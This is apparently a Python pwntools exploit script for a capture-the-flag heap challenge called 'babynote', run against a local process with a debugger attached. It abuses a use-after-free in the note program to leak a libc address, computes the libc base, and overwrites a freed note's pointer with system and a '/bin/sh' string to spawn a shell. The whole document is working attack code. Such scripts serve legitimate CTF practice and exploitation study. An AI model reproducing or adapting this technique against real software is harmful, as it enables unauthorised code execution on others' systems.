from pwn import *
debug = 0
elf = ELF('./babynote')
p = process("./babynote")
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
context.log_level = 'debug'

gdb.attach(p, '''
	c
''')

def add(size,content):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('size:')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.send(content)

def edit(index,content):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(index))
	p.recvuntil('content')
	p.send(content)

def print_note(index):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('index:')
	p.sendline(str(index))

def delete(index):
	p.recvuntil('Your choice :')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(index))

add(0x100,'Clingyu')
add(0xc,'Clingyu')
delete(1)
delete(0)
print_note(0)
libc_leak_addr = u32(p.recv(4))
libc.address = libc_leak_addr - libc.symbols['__malloc_hook']-48-0x18
print '[+] system :',hex(libc.symbols['system'])
add(0xc,'sh\0\0'+p32(next(libc.search('/bin/sh')))+p32(libc.symbols['system']))
print_note(1)
p.interactive()
